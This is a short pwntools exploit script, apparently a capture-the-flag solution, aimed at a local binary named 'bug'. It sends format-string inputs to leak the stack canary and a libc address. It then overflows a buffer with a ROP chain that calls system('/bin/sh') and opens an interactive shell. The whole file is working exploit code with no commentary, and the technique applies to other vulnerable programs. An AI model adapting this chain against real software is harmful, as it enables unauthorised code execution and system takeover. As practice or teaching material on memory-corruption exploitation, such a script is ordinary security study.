from pwn import *
elf = context.binary = ELF("./bug")
libc = elf.libc
r = elf.process()

# gdb.attach(r, '''
#     b* main+294\n
#     b* main+336\n
#     c
# ''')

mypet = b"%25$p"
sound = b"%21$p"
main = elf.sym["main"]

r.sendlineafter(b"pet's name:\n", mypet)
r.sendlineafter(b"pet's sound:\n", sound)
output = r.recvline()
libc.address = int(output[15:15+14],16) - 0x29d90
canary = int(output[-19:-1],16)
log.success(f"OUTPUT: {output} --> {hex(canary)} and {hex(libc.address)}")
popRdi = libc.address + 0x000000000002a3e5
ret = popRdi + 1
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]
payload = cyclic(64) + p64(canary) + cyclic(8*3) + p64(ret) + p64(popRdi) + p64(binsh) + p64(system)
r.sendline(payload)

r.interactive()